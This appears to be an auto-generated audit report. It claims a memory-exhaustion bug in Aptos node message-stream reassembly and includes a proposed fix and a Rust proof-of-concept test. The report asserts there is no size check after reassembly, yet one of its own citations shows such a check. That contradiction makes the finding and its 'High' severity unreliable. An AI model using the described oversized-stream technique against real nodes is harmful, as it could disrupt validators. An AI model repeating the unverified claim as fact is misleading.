# Audit Report

## Title
Stream Message Reassembly Bypasses max_message_size Limit Due to Integer Division Truncation

## Summary
The network message streaming protocol allows an attacker to bypass the configured `max_message_size` limit (64 MiB) by exploiting an integer division truncation in the `max_fragments` calculation. An attacker can send a stream that reassembles to approximately 68 MiB, exceeding the limit by 4 MiB and potentially causing memory exhaustion on validator nodes.

## Finding Description

The referenced AptosNet Specification at [1](#0-0)  does not exist in the repository. This missing specification has led to an implementation deviation where the sender-side and receiver-side validations are mismatched.

**Sender-Side Validation (Correct):**
The outbound streaming validates that messages don't exceed `max_message_size` [2](#0-1) 

**Receiver-Side Validation (Vulnerable):**
The receiver calculates `max_fragments` using integer division [3](#0-2) 

With default configuration values (MAX_MESSAGE_SIZE = 64 MiB, MAX_FRAME_SIZE = 4 MiB) [4](#0-3) , the calculation yields:
- `max_fragments = 67,108,864 / 4,194,304 = 16` (integer division)

**The Vulnerability:**
The receiver validates that `num_fragments <= max_fragments` [5](#0-4) , but does NOT validate the total reconstructed message size.

An attacker can send:
1. A `StreamHeader` containing approximately `max_frame_size` bytes of data
2. 16 `StreamFragments`, each containing approximately `max_frame_size` bytes

When reassembled [6](#0-5) , the total size is:
- Total ≈ `max_frame_size + (16 × max_frame_size) = 17 × 4 MiB = 68 MiB`

This exceeds `max_message_size` of 64 MiB by 4 MiB, with no validation after reassembly [7](#0-6) 

The completed oversized message is passed to handlers without size validation [8](#0-7) 

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty criteria)

This vulnerability enables:
1. **Validator Node Slowdowns**: Processing oversized messages consumes excessive memory and CPU
2. **Significant Protocol Violation**: Bypasses the configured `max_message_size` resource limit
3. **Memory Exhaustion Attack**: An attacker can send multiple oversized streams concurrently, amplifying memory consumption
4. **Network-Wide Impact**: All validator and fullnode operators are affected

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

## Likelihood Explanation

**Likelihood: High**

- **Attacker Requirements**: Only requires network connectivity to any Aptos node (validator or fullnode)
- **Complexity**: Low - straightforward to craft malicious stream messages
- **Detection**: Difficult to detect as messages appear valid at the frame level
- **Mitigation**: No existing safeguards prevent this attack

## Recommendation

Fix the `max_fragments` calculation to account for the header's data:

```rust
// In network/framework/src/peer/mod.rs, line 168:
// OLD (vulnerable):
let max_fragments = max_message_size / max_frame_size;

// NEW (fixed):
let max_fragments = if max_message_size > max_frame_size {
    (max_message_size - max_frame_size) / max_frame_size
} else {
    0
};
```

Additionally, add validation after message reassembly:

```rust
// In network/framework/src/protocols/stream/mod.rs, after line 108:
pub fn append_fragment(
    &mut self,
    fragment: StreamFragment,
) -> anyhow::Result<Option<NetworkMessage>> {
    let stream = self.stream.as_mut().ok_or_else(|| anyhow::anyhow!("No stream exists!"))?;
    let stream_end = stream.append_fragment(fragment)?;
    
    if stream_end {
        let message = self.stream.take().unwrap().message;
        // NEW: Validate total message size
        let total_size = message.data_len();
        ensure!(
            total_size <= self.max_message_size,
            "Reconstructed message size {} exceeds max_message_size {}",
            total_size,
            self.max_message_size
        );
        Ok(Some(message))
    } else {
        Ok(None)
    }
}

// Need to store max_message_size in InboundStreamBuffer
```

## Proof of Concept

```rust
#[test]
fn test_stream_message_size_bypass() {
    use aptos_memsocket::MemorySocket;
    use futures::{executor::block_on, SinkExt, StreamExt};
    
    let (memsocket_tx, memsocket_rx) = MemorySocket::new_pair();
    
    const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024; // 4 MiB
    const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; // 64 MiB
    
    let mut message_tx = MultiplexMessageSink::new(memsocket_tx, MAX_FRAME_SIZE);
    let mut message_rx = MultiplexMessageStream::new(memsocket_rx, MAX_FRAME_SIZE);
    
    // Create a malicious stream header with max_frame_size bytes
    let header = MultiplexMessage::Stream(StreamMessage::Header(StreamHeader {
        request_id: 1,
        num_fragments: 16, // Maximum allowed by max_fragments calculation
        message: NetworkMessage::DirectSendMsg(DirectSendMsg {
            protocol_id: ProtocolId::ConsensusRpcBcs,
            priority: 0,
            raw_msg: vec![0; MAX_FRAME_SIZE - 100], // Nearly max_frame_size
        }),
    }));
    
    // Send header
    block_on(message_tx.send(&header)).unwrap();
    
    // Send 16 fragments, each with max_frame_size bytes
    for i in 1..=16 {
        let fragment = MultiplexMessage::Stream(StreamMessage::Fragment(StreamFragment {
            request_id: 1,
            fragment_id: i,
            raw_data: vec![0; MAX_FRAME_SIZE - 50], // Nearly max_frame_size
        }));
        block_on(message_tx.send(&fragment)).unwrap();
    }
    
    // Receive and reassemble
    let mut inbound_stream = InboundStreamBuffer::new(16);
    
    // This should succeed but results in a message > MAX_MESSAGE_SIZE
    let header_msg = block_on(message_rx.next()).unwrap().unwrap();
    if let MultiplexMessage::Stream(StreamMessage::Header(h)) = header_msg {
        inbound_stream.new_stream(h).unwrap();
    }
    
    let mut total_size = MAX_FRAME_SIZE - 100;
    for _ in 1..=16 {
        let frag_msg = block_on(message_rx.next()).unwrap().unwrap();
        if let MultiplexMessage::Stream(StreamMessage::Fragment(f)) = frag_msg {
            total_size += f.raw_data.len();
            if let Some(completed_msg) = inbound_stream.append_fragment(f).unwrap() {
                let actual_size = completed_msg.data_len();
                assert!(actual_size > MAX_MESSAGE_SIZE, 
                    "Bypass successful: {} bytes > {} bytes limit", 
                    actual_size, MAX_MESSAGE_SIZE);
            }
        }
    }
}
```

## Notes

The missing AptosNet Specification referenced in the code comments represents a significant documentation gap that has enabled this implementation deviation. The specification should be restored and implementation should be verified against it to prevent similar issues.

### Citations

**File:** network/framework/src/protocols/wire/messaging/v1/mod.rs (L8-10)
```rust
//! The [AptosNet Specification](https://github.com/aptos-labs/aptos-core/blob/main/documentation/specifications/network/messaging-v1.md)
//! describes in greater detail how these messages are sent and received
//! over-the-wire.
```

**File:** network/framework/src/protocols/stream/mod.rs (L146-153)
```rust
        ensure!(
            header_num_fragments > 0,
            "Stream header must specify at least one fragment!"
        );
        ensure!(
            (header_num_fragments as usize) <= max_fragments,
            "Stream header exceeds max fragments limit!"
        );
```

**File:** network/framework/src/protocols/stream/mod.rs (L200-209)
```rust
        // Append the fragment data to the message
        let raw_data = &mut fragment.raw_data;
        match &mut self.message {
            NetworkMessage::Error(_) => {
                panic!("StreamHeader for NetworkMessage::Error(_) should be rejected!")
            },
            NetworkMessage::RpcRequest(request) => request.raw_request.append(raw_data),
            NetworkMessage::RpcResponse(response) => response.raw_response.append(raw_data),
            NetworkMessage::DirectSendMsg(message) => message.raw_msg.append(raw_data),
        }
```

**File:** network/framework/src/protocols/stream/mod.rs (L266-273)
```rust
        // Verify that the message size is within limits
        let message_data_len = message.data_len();
        ensure!(
            message_data_len <= self.max_message_size,
            "Message length {} exceeds max message size {}!",
            message_data_len,
            self.max_message_size,
        );
```

**File:** network/framework/src/peer/mod.rs (L168-168)
```rust
        let max_fragments = max_message_size / max_frame_size;
```

**File:** network/framework/src/peer/mod.rs (L543-558)
```rust
    fn handle_inbound_stream_message(
        &mut self,
        message: StreamMessage,
    ) -> Result<(), PeerManagerError> {
        match message {
            StreamMessage::Header(header) => {
                self.inbound_stream.new_stream(header)?;
            },
            StreamMessage::Fragment(fragment) => {
                if let Some(message) = self.inbound_stream.append_fragment(fragment)? {
                    self.handle_inbound_network_message(message)?;
                }
            },
        }
        Ok(())
    }
```

**File:** network/framework/src/peer/mod.rs (L596-599)
```rust
        match message {
            MultiplexMessage::Message(message) => self.handle_inbound_network_message(message),
            MultiplexMessage::Stream(message) => self.handle_inbound_stream_message(message),
        }
```

**File:** config/src/config/network_config.rs (L49-50)
```rust
pub const MAX_FRAME_SIZE: usize = 4 * 1024 * 1024; /* 4 MiB large messages will be chunked into multiple frames and streamed */
pub const MAX_MESSAGE_SIZE: usize = 64 * 1024 * 1024; /* 64 MiB */
```
